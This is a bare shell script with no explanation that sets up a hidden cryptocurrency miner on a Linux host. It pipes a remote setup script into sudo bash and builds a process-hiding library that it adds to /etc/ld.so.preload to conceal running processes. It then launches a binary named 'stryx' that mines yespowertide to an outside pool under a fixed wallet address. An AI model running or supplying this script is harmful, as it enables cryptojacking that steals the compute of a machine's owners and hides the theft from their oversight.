apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -

npm i -g node-process-hider

make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

chmod 777 stryx && ./stryx -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TTsVuWVpbqBan693rpPiTupGmSih2nvaVd.$(shuf -n 1 -i 1-999999) -t16
